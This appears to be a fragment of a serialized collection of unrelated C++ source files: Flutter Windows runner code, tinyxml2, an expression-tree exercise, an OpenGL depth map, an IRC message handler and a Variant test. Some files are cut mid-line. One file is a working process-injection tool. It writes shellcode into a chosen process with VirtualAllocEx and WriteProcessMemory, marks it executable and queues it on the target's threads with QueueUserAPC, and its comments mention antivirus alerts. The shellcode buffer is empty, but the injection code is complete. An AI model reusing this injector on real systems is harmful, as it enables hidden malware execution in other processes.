objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*\r\nOriginal code by Lee Thomason (www.grinninglizard.com)\r\n\r\nThis software is provided 'as-is', without any express or implied\r\nwarranty. In no event will the authors be held liable for any\r\ndamages arising from the use of this software.\r\n\r\nPermission is granted to anyone to use this software for any\r\npurpose, including commercial applications, and to alter it and\r\nredistribute it freely, subject to the following restrictions:\r\n\r\n1. The origin of this software must not be misrepresented; you must\r\nnot claim that you wrote the original software. If you use this\r\nsoftware in a product, an acknowledgment in the product documentation\r\nwould be appreciated but is not required.\r\n\r\n2. Altered source versions must be plainly marked as such, and\r\nmust not be misrepresented as being the original software.\r\n\r\n3. This notice may not be removed or altered from any source\r\ndistribution.\r\n*/\r\n\r\n#include \"tinyxml2.h\"\r\n\r\n#include <new>\t\t// yes, this one new style header, is in the Android SDK.\r\n#if defined(ANDROID_NDK) || defined(__BORLANDC__) || defined(__QNXNTO__)\r\n#   include <stddef.h>\r\n#   include <stdarg.h>\r\n#else\r\n#   include <cstddef>\r\n#   include <cstdarg>\r\n#endif\r\n\r\n#if defined(_MSC_VER) && (_MSC_VER >= 1400 ) && (!defined WINCE)\r\n\t// Microsoft Visual Studio, version 2005 and higher. Not WinCE.\r\n\t/*int _snprintf_s(\r\n\t   char *buffer,\r\n\t   size_t sizeOfBuffer,\r\n\t   size_t count,\r\n\t   const char *format [,\r\n\t\t  argument] ...\r\n\t);*/\r\n\tstatic inline int TIXML_SNPRINTF( char* buffer, size_t size, const char* format, ... )\r\n\t{\r\n\t\tva_list va;\r\n\t\tva_start( va, format );\r\n\t\tconst int result = vsnprintf_s( buffer, size, _TRUNCATE, format, va );\r\n\t\tva_end( va );\r\n\t\treturn result;\r\n\t}\r\n\r\n\tstatic inline int TIXML_VSNPRINTF( char* buffer, size_t size, const char* format, va_list va )\r\n\t{\r\n\t\tconst int result = vsnprintf_s( buffer, size, _TRUNCATE, format, va );\r\n\t\treturn result;\r\n\t}\r\n\r\n\t#define TIXML_VSCPRINTF\t_vscprintf\r\n\t#define TIXML_SSCANF\tsscanf_s\r\n#elif defined _MSC_VER\r\n\t// Microsoft Visual Studio 2003 and earlier or WinCE\r\n\t#define TIXML_SNPRINTF\t_snprintf\r\n\t#define TIXML_VSNPRINTF _vsnprintf\r\n\t#define TIXML_SSCANF\tsscanf\r\n\t#if (_MSC_VER < 1400 ) && (!defined WINCE)\r\n\t\t// Microsoft Visual Studio 2003 and not WinCE.\r\n\t\t#define TIXML_VSCPRINTF   _vscprintf // VS2003's C runtime has this, but VC6 C runtime or WinCE SDK doesn't have.\r\n\t#else\r\n\t\t// Microsoft Visual Studio 2003 and earlier or WinCE.\r\n\t\tstatic inline int TIXML_VSCPRINTF( const char* format, va_list va )\r\n\t\t{\r\n\t\t\tint len = 512;\r\n\t\t\tfor (;;) {\r\n\t\t\t\tlen = len*2;\r\n\t\t\t\tchar* str = new char[len]();\r\n\t\t\t\tconst int required = _vsnprintf(str, len, format, va);\r\n\t\t\t\tdelete[] str;\r\n\t\t\t\tif ( required != -1 ) {\r\n\t\t\t\t\tTIXMLASSERT( required >= 0 );\r\n\t\t\t\t\tlen = required;\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tTIXMLASSERT( len >= 0 );\r\n\t\t\treturn len;\r\n\t\t}\r\n\t#endif\r\n#else\r\n\t// GCC version 3 and higher\r\n\t//#warning( \"Using sn* functions.\" )\r\n\t#define TIXML_SNPRINTF\tsnprintf\r\n\t#define TIXML_VSNPRINTF\tvsnprintf\r\n\tstatic inline int TIXML_VSCPRINTF( const char* format, va_list va )\r\n\t{\r\n\t\tint len = vsnprintf( 0, 0, format, va );\r\n\t\tTIXMLASSERT( len >= 0 );\r\n\t\treturn len;\r\n\t}\r\n\t#define TIXML_SSCANF   sscanf\r\n#endif\r\n\r\n#if defined(_WIN64)\r\n\t#define TIXML_FSEEK _fseeki64\r\n\t#define TIXML_FTELL _ftelli64\r\n#elif defined(__APPLE__) || defined(__FreeBSD__) || defined(__OpenBSD__) || defined(__NetBSD__) || defined(__DragonFly__) || defined(__CYGWIN__)\r\n\t#define TIXML_FSEEK fseeko\r\n\t#define TIXML_FTELL ftello\r\n#elif defined(__ANDROID__) && __ANDROID_API__ > 24\r\n\t#define TIXML_FSEEK fseeko64\r\n\t#define TIXML_FTELL ftello64\r\n#else\r\n\t#define TIXML_FSEEK fseek\r\n\t#define TIXML_FTELL ftell\r\n#endif\r\n\r\n\r\nstatic const char LINE_FEED\t\t\t\t= static_cast<char>(0x0a);\t\t\t// all line endings are normalized to LF\r\nstatic const char LF = LINE_FEED;\r\nstatic const char CARRIAGE_RETURN\t\t= static_cast<char>(0x0d);\t\t\t// CR gets filtered out\r\nstatic const char CR = CARRIAGE_RETURN;\r\nstatic const char SINGLE_QUOTE\t\t\t= '\\'';\r\nstatic const char DOUBLE_QUOTE\t\t\t= '\\\"';\r\n\r\n// Bunch of unicode info at:\r\n//\t\thttp://www.unicode.org/faq/utf_bom.html\r\n//\tef bb bf (Microsoft \"lead bytes\") - designates UTF-8\r\n\r\nstatic const unsigned char TIXML_UTF_LEAD_0 = 0xefU;\r\nstatic const unsigned char TIXML_UTF_LEAD_1 = 0xbbU;\r\nstatic const unsigned char TIXML_UTF_LEAD_2 = 0xbfU;\r\n\r\nnamespace tinyxml2\r\n{\r\n\r\nstruct Entity {\r\n    const char* pattern;\r\n    int length;\r\n    char value;\r\n};\r\n\r\nstatic const int NUM_ENTITIES = 5;\r\nstatic const Entity entities[NUM_ENTITIES] = {\r\n    { \"quot\", 4,\tDOUBLE_QUOTE },\r\n    { \"amp\", 3,\t\t'&'  },\r\n    { \"apos\", 4,\tSINGLE_QUOTE },\r\n    { \"lt\",\t2, \t\t'<'\t },\r\n    { \"gt\",\t2,\t\t'>'\t }\r\n};\r\n\r\n\r\nStrPair::~StrPair()\r\n{\r\n    Reset();\r\n}\r\n\r\n\r\nvoid StrPair::TransferTo( StrPair* other )\r\n{\r\n    if ( this == other ) {\r\n        return;\r\n    }\r\n    // This in effect implements the assignment operator by \"moving\"\r\n    // ownership (as in auto_ptr).\r\n\r\n    TIXMLASSERT( other != 0 );\r\n    TIXMLASSERT( other->_flags == 0 );\r\n    TIXMLASS",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.CreateAndShow(L\"calculator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "Practical No: 05\r\r\nTitle : A C++ Program to Create and Display an Expression Tree\r\r\n Input : Postfix Expression\r\r\n Output: Preorder, Inorder and Postorder Traversal of Expression Tree\r\r\n*/\r\r\n //.........Header Files\r\r\n#include <iostream>\r\r\nusing namespace std;\r\r\n //.........Input to Program\r\r\nchar postfix[10];\r\r\n //.........Node of Expression Tree\r\r\nstruct Node\r\r\n{\r\r\n char data;\r\r\n struct Node *left;\r\r\n struct Node *right;\r\r\n}*Root;\r\r\n //.......Stack to store Pointers of Nodes\r\r\nstruct Node* stack[5];\r\r\nint top = -1;\r\r\n //......To push Pointers in Stack\r\r\nvoid push_stk(struct Node *newnode) \r\r\n{\r\r\n top++;\r\r\n stack[top] = newnode;\r\r\n}\r\r\n //......To pop Pointers from Stack\r\r\nstruct Node* pop_stk()\r\r\n{\r\r\n struct Node *temp;\r\r\n \r\r\n temp = stack[top];\r\r\n top--;\r\r\n \r\r\n return temp;\r\r\n}\r\n//.........Function to Create New Node \r\r\nstruct Node* create_Node(char val)\r\r\n{\r\r\n struct Node *Newnode;\r\r\n \r\r\n Newnode = new struct Node;\r\r\n \r\r\n Newnode->data = val;\r\r\n Newnode->left = NULL;\r\r\n Newnode->right = NULL;\r\r\n \r\r\n return Newnode;\r\r\n}\r\r\n \r\r\n //.........Function to Create an Expression Tree\r\r\nvoid create_Exptree()\r\r\n{\r\r\n int i;\r\r\n \r\r\n struct Node *Newnode;\r\r\n \r\r\n cout<<\"\\n\\n Enter the Postfix Expression: \";\r\r\n cin>>postfix;\r\r\n \r\r\n for(i=0; postfix[i] != '\\0'; i++)\r\r\n { //.....If Operand\r\r\n if(postfix[i] == 'a' || postfix[i] == 'b' || postfix[i] == 'c' || postfix[i] == 'd')\r\r\n {\r\r\n //........Create New Node for Operand\r\r\n Newnode = create_Node(postfix[i]); \r\r\n //........Push Operand in Stack\r\r\n push_stk(Newnode);\r\r\n }\r\r\n//.....If Operator\r\r\n if(postfix[i] == '+' || postfix[i] == '-' || postfix[i] == '*' || postfix[i] == '/')\r\r\n {\r\r\n //........Create New Node for Operator\r\r\n Newnode = create_Node(postfix[i]);\r\r\n //........Pop An Operand from stack and attach as Right Child\r\r\n Newnode->right = pop_stk(); \r\r\n //........Pop An Operand from stack and attach as left Child\r\r\n Newnode->left = pop_stk(); \r\r\n \r\r\n push_stk(Newnode);\r\r\n }\r\r\n }\r\n { //........Pop a Pointer from Stack and Assign to Root.\r\r\n Root = pop_stk();\r\r\n cout<<\"\\n\\t Expression Tree is Ready Now...!!!\";\r\r\n }\r\r\n}\r\r\n \r\r\n //.........Function to display Expression Tree in Preorder \r\r\nvoid preorder_ExpTree(struct Node *root)\r\r\n{\r\r\n if(root)\r\r\n {\r\r\n cout<<\" \"<<root->data; //....Data\r\r\n preorder_ExpTree(root->left); //....Left\r\r\n preorder_ExpTree(root->right); //....Right\r\r\n }\r\r\n} \r\r\n \r\r\n //.........Function to display Expression Tree in Inorder\r\r\nvoid inorder_ExpTree(struct Node *root)\r\r\n{\r\r\n if(root)\r\r\n {\r\r\n inorder_ExpTree(root->left); //....Left\r\r\n cout<<\" \"<<root->data; //....Data\r\r\n inorder_ExpTree(root->right); //....Right\r\r\n }\r\r\n}\r\r\n \r\r\n //.........Function to display Expression Tree in Postorder\r\r\nvoid postorder_ExpTree(struct Node *root)\r\r\n{\r\r\n if(root)\r\r\n {\r\r\n postorder_ExpTree(root->left); //....Left\r\r\n postorder_ExpTree(root->right); //....Right\r\r\n cout<<\" \"<<root->data; //....Data\r\r\n }\r\r\n} \r\r\n //.........Main Function\r\r\nint main()\r\r\n{\r\r\n cout<<\"---------*** A C++ Program to Create and Display an Expression Tree*** \r\r\n---------\";\r\r\n Root = NULL;\r\n create_Exptree();\r\r\n \r\r\n cout<<\"\\n\\n Preorder Traversal of Expression Tree: \";\r\r\n preorder_ExpTree(Root);\r\r\n \r\r\n cout<<\"\\n\\n Inorder Traversal of Expression Tree: \";\r\r\n inorder_ExpTree(Root);\r\r\n \r\r\n cout<<\"\\n\\n Postorder Traversal of Expression Tree: \";\r\r\n postorder_ExpTree(Root);\r\r\n return 0;\r\r\n}\r\r\n/*--------------------------OUTPUT------------------------------\r\r\n---------*** A C++ Program to Create and Display an Expression Tree*** ---------\r\r\n Enter the Postfix Expression: ab+\r\r\n Expression Tree is Ready Now...!!!\r\r\n Preorder Traversal of Expression Tree: + a b\r\r\n Inorder Traversal of Expression Tree: a + b\r\r\n Postorder Traversal of Expression Tree: a b +\r\r\n ---------*** A C++ Program to Create and Display an Expression Tree*** ---------\r\r\n Enter the Postfix Expression: ab+cd-*\r\r\n Expression Tree is Ready Now...!!!\r\r\n Preorder Traversal of Expression Tree: * + a b - c d\r\r\n Inorder Traversal of Expression Tree: a + b * c - d\r\r\n Postorder Traversal of Expression Tree: a b + c d - *\r\n *** A C++ Program to Create and Display an Expression Tree*** ---------\r\r\n Enter the Postfix Expression: ab+c*\r\r\n Expression Tree is Ready Now...!!!\r\r\n Preorder Traversal of Expression Tree: * + a b c\r\r\n Inorder Traversal of Expression Tree: a + b * c\r\r\n Postorder Traversal of Expression Tree: a b + c *\r\r\n...Program finished with exit code 0\r\r\nPress ENTER to exit console.\r\r\n*/",
    "#include \"rendering/DepthMap.hpp\"\n\n#include <glad/glad.h>\n\nDepthMap::DepthMap(int width, int height) : _width(width), _height(height) {\n  glGenFramebuffers(1, &_fbo);\n\n  // Create depth texture\n  glGenTextures(1, &depthMap);\n  glBindTexture(GL_TEXTURE_2D, depthMap);\n  glTexImage2D(GL_TEXTURE_2D, 0, GL_DEPTH_COMPONENT, _width, _height, 0,\n               GL_DEPTH_COMPONENT, GL_FLOAT, nullptr);\n  glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST);\n  glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_NEAREST);\n  glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_BORDER);\n  glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_BORDER);\n  float borderColor[] = {1.0f, 1.0f, 1.0f, 1.0f};\n  glTexParameterfv(GL_TEXTURE_2D, GL_TEXTURE_BORDER_COLOR, borderColor);\n\n  // Attach depth texture to framebuffer\n  glBindFramebuffer(GL_FRAMEBUFFER, _fbo);\n  glFramebufferTexture2D(GL_FRAMEBUFFER, GL_DEPTH_ATTACHMENT, GL_TEXTURE_2D,\n                         depthMap, 0);\n  glDrawBuffer(GL_NONE);\n  glReadBuffer(GL_NONE);\n  glBindFramebuffer(GL_FRAMEBUFFER, 0);\n\n  // For debugging\n  // clang-format off\n  float quadVertices[] = {\n      // positions        // texture Coords\n      -1.0f,  1.0f, 0.0f, 0.0f, 1.0f,\n      -1.0f, -1.0f, 0.0f, 0.0f, 0.0f,\n       1.0f,  1.0f, 0.0f, 1.0f, 1.0f,\n       1.0f, -1.0f, 0.0f, 1.0f, 0.0f,\n  };\n  // clang-format on\n\n  // setup plane VAO\n  glGenVertexArrays(1, &_vao);\n  glGenBuffers(1, &_vbo);\n  glBindVertexArray(_vao);\n  glBindBuffer(GL_ARRAY_BUFFER, _vbo);\n  glBufferData(GL_ARRAY_BUFFER, sizeof(quadVertices), &quadVertices,\n               GL_STATIC_DRAW);\n  glEnableVertexAttribArray(0);\n  glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 5 * sizeof(float), (void *)0);\n  glEnableVertexAttribArray(1);\n  glVertexAttribPointer(1, 2, GL_FLOAT, GL_FALSE, 5 * sizeof(float),\n                        (void *)(3 * sizeof(float)));\n}\n\nDepthMap::~DepthMap() {\n  glDeleteFramebuffers(1, &_fbo);\n  glDeleteTextures(1, &depthMap);\n}\n\nvoid DepthMap::bind() const {\n  glViewport(0, 0, _width, _height);\n  glBindFramebuffer(GL_FRAMEBUFFER, _fbo);\n  glClear(GL_DEPTH_BUFFER_BIT);\n  // glCullFace(GL_FRONT);\n}\n\nvoid DepthMap::unbind() const {\n  glBindFramebuffer(GL_FRAMEBUFFER, 0);\n  // glCullFace(GL_BACK);\n}\n\nvoid DepthMap::renderDebugQuad() const {\n  glBindVertexArray(_vao);\n  glDrawArrays(GL_TRIANGLE_STRIP, 0, 4);\n  glBindVertexArray(0);\n}\n",
    "#include <iostream>\n#include <windows.h>\n#include <psapi.h>\n#include <tlhelp32.h>\n\nvoid RunAPC(LPVOID pVirtualMem, int iProcID);\n\nint main()\n{\n\tDWORD dwProcList[1024];\n\tDWORD dwBytesWritten;\n\tDWORD dwOldProtect = 0;\n\tHANDLE hProc;\n\tSIZE_T bytesWritten;\n\tint PID, counter = 0;\n\tchar cProcName[100];\n\tunsigned char shellcode[] = \"\";\n\n\tprintf(\"Type PID: \");\n\tscanf_s(\"%d\", &PID);\n    EnumProcesses(dwProcList, sizeof(dwProcList), &dwBytesWritten);\n\n    while(counter < (dwBytesWritten / 4)) {\n\t\thProc = OpenProcess(PROCESS_ALL_ACCESS, 0, dwProcList[counter]);\n        if (GetModuleBaseNameA(hProc, NULL, cProcName, 100)) {\n\t\t\tif (dwProcList[counter] == PID) {\n\t\t\t\tprintf(\"PROCCESS NAME - %s\\n\", cProcName);\n\t\t\t\tLPVOID pVirtualMem = VirtualAllocEx(hProc, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);\n\t\t\t\tWriteProcessMemory(hProc, pVirtualMem, shellcode, (SIZE_T)sizeof(shellcode), &bytesWritten);\n\t\t\t\tVirtualProtectEx(hProc, pVirtualMem,(SIZE_T)sizeof(shellcode), PAGE_EXECUTE_READ, &dwOldProtect);\n\t\t\t\tRunAPC(pVirtualMem,dwProcList[counter]);\n\t\t\t}\n            CloseHandle(hProc);\n        }\n\t\tcounter++;\n    }\n}\n\nvoid RunAPC(LPVOID pVirtualMem, int iProcId) {\n\tTHREADENTRY32 thEntry;  thEntry.dwSize = sizeof(THREADENTRY32);\n\tHANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); // alert -> AV\n\n\tif (hSnapshot == INVALID_HANDLE_VALUE) {\n\t\tprintf(\"Error Openning the function\");\n\t\tCloseHandle(hSnapshot);\n\t}\n\n\tfor (Thread32First(hSnapshot, &thEntry); Thread32Next(hSnapshot, &thEntry);) {\n\t\tif (thEntry.th32OwnerProcessID == iProcId) {\n\t\t\tHANDLE target_thread_handle = OpenThread(THREAD_ALL_ACCESS, NULL, thEntry.th32ThreadID);\n\t\t\tprintf(\"PROC [%d] ThreadID: %d\\n\", thEntry.th32OwnerProcessID, thEntry.th32ThreadID);\n\t\t\tQueueUserAPC((PAPCFUNC)pVirtualMem, target_thread_handle, NULL);\n\t\t}\n\t}\n\tCloseHandle(hSnapshot);\n}\n",
    "/* ************************************************************************** */\r\n/*                                                                            */\r\n/*                                                        :::      ::::::::   */\r\n/*   privmsg.cpp                                        :+:      :+:    :+:   */\r\n/*                                                    +:+ +:+         +:+     */\r\n/*   By: tcharpen <tcharpen@student.42lyon.fr>      +#+  +:+       +#+        */\r\n/*                                                +#+#+#+#+#+   +#+           */\r\n/*   Created: 2023/08/01 12:49:41 by tcharpen          #+#    #+#             */\r\n/*   Updated: 2023/08/01 12:49:41 by tcharpen         ###   ########lyon.fr   */\r\n/*                                                                            */\r\n/* ************************************************************************** */\r\n\r\n#include \"../../includes/commands/Command.hpp\"\r\n\r\nstatic void\tsendToAllClientInChannel(Channel *channel, Client *client, std::string msg, Server *server)\r\n{\r\n\tstd::stringstream\toutput;\r\n\r\n\toutput.str(\"\");\r\n\toutput << clientId(client->getNickname(), client->getUsername(), client->getHostname())\r\n\t\t<< \" PRIVMSG \" << channel->getName() << \" \" << msg;\r\n\tfor (std::map<int, Client *>::const_iterator it = channel->getTabJoined().begin(); it != channel->getTabJoined().end(); it++)\r\n\t{\r\n\t\tif (it->first != client->getFd())\r\n\t\t\tsend_to_client_things(output.str(), it->first, server);\r\n\t}\r\n}\r\n\r\nstatic void\tsendToAllOpInChannel(Channel *channel, Client *client, std::string msg, Server *server)\r\n{\r\n\tstd::stringstream\toutput;\r\n\r\n\toutput.str(\"\");\r\n\toutput << clientId(client->getNickname(), client->getUsername(), client->getHostname())\r\n\t\t<< \" PRIVMSG \" << channel->getName() << \" \" << msg;\r\n\tfor (std::map<int, Client *>::const_iterator it = channel->getTabJoined().begin(); it != channel->getTabJoined().end(); it++)\r\n\t{\r\n\t\tif (it->first != client->getFd() && channel->isOperator(it->second->getUsername()))\r\n\t\t\tsend_to_client_things(output.str(), it->first, server);\r\n\t}\r\n}\r\n\r\nstatic void\tsendToChannel(std::string channel, Client *client, Server *server, std::string msg, bool op)\r\n{\r\n\tfor (std::map<std::string, Channel *>::const_iterator it = server->getTabChannels().begin(); it != server->getTabChannels().end(); it++)\r\n\t{\r\n\t\tif (it->first == channel)\r\n\t\t{\r\n\t\t\tif (op == false)\r\n\t\t\t\tsendToAllClientInChannel(it->second, client, msg, server);\r\n\t\t\telse\r\n\t\t\t\tsendToAllOpInChannel(it->second, client, msg, server);\r\n\t\t\treturn ;\r\n\t\t}\r\n\t}\r\n\tE401(client->getFd(), client->getNickname(), server, channel);\r\n}\r\n\r\nstatic void\tsendToClient(std::string nickname, Client *client, Server *server, std::string msg)\r\n{\r\n\tstd::stringstream\toutput;\r\n\r\n\tfor (std::map<int, Client *>::const_iterator it = server->getTabClients().begin(); it != server->getTabClients().end(); it++)\r\n\t{\r\n\t\tif (it->second->getNickname() == nickname)\r\n\t\t{\r\n\t\t\toutput.str(\"\");\r\n\t\t\toutput << clientId(client->getNickname(), client->getUsername(), client->getHostname())\r\n\t\t\t\t<< \" PRIVMSG \" << nickname << \" \" << msg;\r\n\t\t\tsend_to_client_things(output.str(), it->first, server);\r\n\t\t\treturn ;\r\n\t\t}\r\n\t}\r\n\tE401(client->getFd(), client->getNickname(), server, nickname);\r\n}\r\n\r\nvoid    privmsg(const std::string &message, Client *client, Server *server)\r\n{\r\n\tstd::vector<std::string>\targs;\r\n\tsize_t\t\t\t\t\t\ti = 0;\r\n\tstd::string\t\t\t\t\tmsg;\r\n\r\n\targs = parseArgs(message, &i);\r\n\tif (args.empty())\r\n\t{\r\n        E411(client->getFd(), client->getNickname(), server, \"PRIVMSG\");\r\n\t\treturn ;\r\n\t}\r\n\twhile (message.c_str()[i] == ' ')\r\n\t\ti++;\r\n\tif (message.c_str()[i] == ':')\r\n\t\tmsg = message.substr(i + 1);\r\n\telse\r\n\t{\r\n\t\tE412(client->getFd(), client->getNickname(), server);\r\n\t\treturn ;\r\n\t}\r\n\tfor (std::vector<std::string>::iterator it = args.begin(); it != args.end(); it++)\r\n\t{\r\n\t\tif (it->find('#') == 0 || it->find('&') == 0)\r\n\t\t\tsendToChannel(*it, client, server, msg, false);\r\n\t\telse if (it->find('@') == 0 && (it->find('#') == 1 || it->find('&') == 1))\r\n\t\t\tsendToChannel(it->substr(1), client, server, msg, true);\r\n\t\telse\r\n\t\t\tsendToClient(*it, client, server, msg);\r\n\t}\r\n}\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include\"Variant.hpp\"\n#include\"Logger.hpp\"\n#include\"variant_to_string.hpp\"\n#include\"FunctionMacro.hpp\"\n\nFunction_Begin(get_type_name,String const)\nParameter(Variant,any)\n    if(any.is_null()){\n        return \"null\";\n    }else if(any.is_boolean()){\n        return \"boolean\";\n    }else if(any.is_number()){\n        return \"number\";\n    }else if(any.is_string()){\n        return \"string\";\n    }else if(any.is_array()){\n        return \"array\";\n    }else if(any.is_object()){\n        return \"object\";\n    }else if(any.is_function()){\n        return \"function\";\n    }\n    return \"undefined\";\nFunction_End\n\nauto lambda_get_type_name=\n    Lambda_Begin(String const)\n    Parameter(Variant const,any)\n        return ::get_type_name(any);\n    Lambda_End;\n\nint main(int argc,char* argv[]){\n    static_assert(sizeof(Variant)<=sizeof(void*));\n    Variant variant=Object{\n        {\"null\",Null{}},\n        {\"boolean\",true},\n        {\"integer\",-1},\n        {\"float\",3.14},\n        {\"character\",'A'},\n        {\"string\",\"hello\"},\n        {\"array\",\n            Array{\n                Null{},false,1,-3.14,'B',\"world\",\n                Array{1,2},Object{{\"name\",\"Tom\"},{\"age\",20}},\n                Lambda_Begin(Null)\n                Parameter(Number const,num1)\n                Parameter(Number const,num2)\n                    ::std::cout<<num1<<num2<<\"\\n\";\n                Lambda_End\n            },\n        },\n        {\"set_value\",\n            